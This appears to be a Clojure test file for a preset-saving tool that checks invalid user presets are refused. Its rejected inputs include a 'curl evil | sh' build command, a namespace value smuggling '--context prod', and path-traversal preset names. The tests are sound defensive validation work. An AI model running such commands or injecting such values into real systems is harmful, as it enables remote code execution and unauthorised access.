(ns zent.presets-test
  "Presets read from EDN, and the user's own saved/deleted at runtime
  (loading a catalog's presets: zent.catalog-test)."
  (:require [clojure.test :refer [deftest is testing]]
            [zent.presets :as presets]))

(def ^:private catalog
  {:defaults {:allow-k8s-contexts ["local"]}
   :components {:db {:kind :docker-compose :repo "db"}
                :front {:kind :k8s :repo "x" :manifests ["m.yaml"] :workload "deployment/f"
                        :context "local" :namespace "dev"}}
   :presets {:shipped {:db {:mode :on}}}})

(deftest read-spec-test
  (is (= {:db {:mode :on :port 1}} (presets/read-spec "[:db {:port 1}]")))
  (is (thrown-with-msg? clojure.lang.ExceptionInfo #"a preset is a vector"
                        (presets/read-spec "{:db {}}"))))

(deftest user-presets-test
  (let [dir (str (System/getProperty "java.io.tmpdir") "/zent-presets-test-" (System/currentTimeMillis))]
    (testing "given a valid spec, when saved, then it loads back and is the user's"
      (presets/save! catalog dir :mine "[:db :front]")
      (is (= {:mine {:db {:mode :on} :front {:mode :on}}} (presets/load-files dir)))
      (is (presets/user-preset? dir :mine)))

    (testing "invalid specs are refused before anything is written"
      (is (thrown-with-msg? clojure.lang.ExceptionInfo #"unknown component"
                            (presets/save! catalog dir :bad "[:nope]")))
      (is (thrown-with-msg? clojure.lang.ExceptionInfo #"isn't in :allow-k8s-contexts"
                            (presets/save! catalog dir :bad "[:front {:context \"prod\"}]")))
      (is (thrown-with-msg? clojure.lang.ExceptionInfo #"catalog's own presets"
                            (presets/save! catalog dir :shipped "[:db]")))
      (is (thrown-with-msg? clojure.lang.ExceptionInfo #"a user preset may only set"
                            (presets/save! catalog dir :bad "[:db {:build-cmd \"curl evil | sh\"}]")))
      (is (thrown-with-msg? clojure.lang.ExceptionInfo #"a user preset may only set"
                            (presets/save! catalog dir :bad "[:db {:source-env {\"X\" {:component :front}}}]")))
      (is (thrown-with-msg? clojure.lang.ExceptionInfo #"Invalid"
                            (presets/save! catalog dir :bad "[:front {:namespace \"dev --context prod\"}]")))
      (is (not (presets/user-preset? dir :bad))))

    (testing "only a user preset can be deleted"
      (is (thrown-with-msg? clojure.lang.ExceptionInfo #"isn't a user preset"
                            (presets/delete! dir :shipped)))
      (presets/delete! dir :mine)
      (is (= {} (presets/load-files dir))))

    (testing "a missing dir is no presets"
      (is (= {} (presets/load-files (str dir "/nope")))))))

(deftest preset-names-test
  (let [dir (str (System/getProperty "java.io.tmpdir") "/zent-preset-names-test")]
    (testing "a name that would leave the presets dir is refused, for save and delete alike"
      (is (thrown-with-msg? clojure.lang.ExceptionInfo #"invalid preset name"
                            (presets/delete! dir (keyword "x/../../escape"))))
      (is (thrown-with-msg? clojure.lang.ExceptionInfo #"invalid preset name"
                            (presets/save! {} dir (keyword "../x") "[:db]"))))
    (testing "a file that doesn't read is skipped, the others still load"
      (.mkdirs (java.io.File. dir))
      (spit (str dir "/good.edn") "[:db]")
      (spit (str dir "/broken.edn") "[:db {:unclosed")
      (try
        (is (= #{:good} (set (keys (presets/load-files dir)))))
        (finally (run! #(.delete %) (.listFiles (java.io.File. dir))))))))
